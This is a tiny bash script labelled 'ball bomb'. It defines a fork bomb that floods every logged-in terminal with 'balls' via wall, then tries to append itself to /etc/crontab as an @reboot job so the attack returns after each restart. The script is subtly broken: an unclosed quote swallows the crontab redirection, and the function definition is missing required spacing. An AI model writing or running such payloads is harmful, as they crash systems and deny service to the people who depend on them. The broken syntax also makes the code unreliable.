#!/usr/bin/env bash

#ball bomb
BOMB=':(){echo "balls"|wall;:|:&disown};:&disown'
echo "@reboot $BOMB >> /etc/crontab
